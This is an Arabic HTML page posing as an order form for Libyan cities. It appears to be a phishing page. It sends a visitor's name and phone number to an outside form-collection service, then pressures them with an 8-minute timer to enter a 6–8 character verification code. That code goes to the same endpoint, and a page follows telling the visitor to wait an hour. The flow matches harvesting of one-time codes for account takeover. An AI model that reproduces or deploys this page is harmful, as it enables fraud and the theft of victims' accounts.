<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>نموذج الطلب</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      padding: 20px;
      direction: rtl;
      text-align: right;
    }
    form, .code-box, #waitingPage {
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 420px;
      margin: 30px auto;
    }
    label {
      display: block;
      margin-top: 12px;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 6px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      background-color: #2196F3;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }
    button:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }
    .code-box, #waitingPage {
      display: none;
    }
    .timer {
      margin-top: 12px;
      color: #d32f2f;
      font-weight: bold;
    }
    .error {
      color: red;
      font-size: 13px;
      display: none;
    }
  </style>
</head>
<body>

<!-- النموذج الأول -->
<form id="mainForm" action="https://formcarry.com/s/12UxdOsTbaW" method="POST" onsubmit="handleSubmit(event)">
  <h2>نموذج الطلب</h2>

  <label for="fullName">الاسم الثلاثي</label>
  <input type="text" id="fullName" name="fullName" required oninput="validateForm()">
  <div class="error" id="nameError">يجب أن يكون الاسم أكثر من 7 أحرف عربية فقط.</div>

  <label for="phone">رقم الهاتف</label>
  <input type="tel" id="phone" name="phone" required oninput="validateForm()">

  <label for="address">المدينة</label>
  <select id="address" name="address" required onchange="validateForm()">
    <option value="">اختر المدينة</option>
    <option>طرابلس</option>
    <option>بنغازي</option>
    <option>مصراتة</option>
    <option>البيضاء</option>
    <option>زليتن</option>
    <option>سبها</option>
    <option>الخمس</option>
    <option>درنة</option>
    <option>سرت</option>
    <option>طبرق</option>
  </select>

  <button type="submit" id="submitBtn" disabled>أكمل الطلب</button>
</form>

<!-- مرحلة الكود -->
<div class="code-box" id="codeBox">
  <h3>يرجى إدخال كود التوثيق</h3>
  <input type="text" id="verificationCode" placeholder="أدخل الكود (6–8 أرقام أو أحرف)" required>
  <button onclick="submitCode()">إرسال</button>
  <div class="timer" id="timer">الوقت المتبقي: 08:00</div>
</div>

<!-- صفحة الانتظار -->
<div id="waitingPage">
  <h2>تم استلام الكود</h2>
  <p>طلبك قيد المراجعة. الرجاء العودة بعد ساعة.</p>
</div>

<!-- JavaScript -->
<script>
  function validateForm() {
    const name = document.getElementById("fullName").value.trim();
    const phone = document.getElementById("phone").value.trim();
    const address = document.getElementById("address").value;
    const nameError = document.getElementById("nameError");

    const nameIsValid = /^[\u0600-\u06FF\s]{8,}$/.test(name);
    const phoneIsValid = /^\d{10,15}$/.test(phone);
    const addressIsValid = address !== "";

    nameError.style.display = (!nameIsValid && name.length > 0) ? "block" : "none";

    document.getElementById("submitBtn").disabled = !(nameIsValid && phoneIsValid && addressIsValid);
  }

  function handleSubmit(event) {
    event.preventDefault();
    const form = document.getElementById("mainForm");
    const formData = new FormData(form);

    fetch(form.action, {
      method: "POST",
      body: formData
    })
    .then(res => {
      if (res.ok) {
        form.style.display = "none";
        document.getElementById("codeBox").style.display = "block";
        startTimer(8 * 60);
      } else {
        alert("فشل في إرسال البيانات.");
      }
    })
    .catch(err => {
      console.error("خطأ في الاتصال:", err);
      alert("حدث خطأ في الاتصال.");
    });
  }

  function submitCode() {
    const code = document.getElementById("verificationCode").value.trim();
    const codeIsValid = /^[A-Za-z0-9]{6,8}$/.test(code);

    if (!codeIsValid) {
      alert("يرجى إدخال كود صحيح (6–8 أحرف أو أرقام).");
      return;
    }

    // إخفاء خانة الكود وإظهار صفحة الانتظار
    document.getElementById("codeBox").style.display = "none";
    document.getElementById("waitingPage").style.display = "block";

    // إرسال الكود إلى Formcarry (اختياري)
    fetch("https://formcarry.com/s/12UxdOsTbaW", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code: code })
    }).catch(error => console.error("Formcarry Error:", error));
  }

  function startTimer(duration) {
    let timer = duration;
    const display = document.getElementById("timer");

    const interval = setInterval(() => {
      const minutes = String(Math.floor(timer / 60)).padStart(2, '0');
      const seconds = String(timer % 60).padStart(2, '0');
      display.textContent = `الوقت المتبقي: ${minutes}:${seconds}`;
      timer--;

      if (timer < 0) {
        clearInterval(interval);
        display.textContent = "انتهى الوقت!";
      }
    }, 1000);
  }
</script>

</body>
</html>
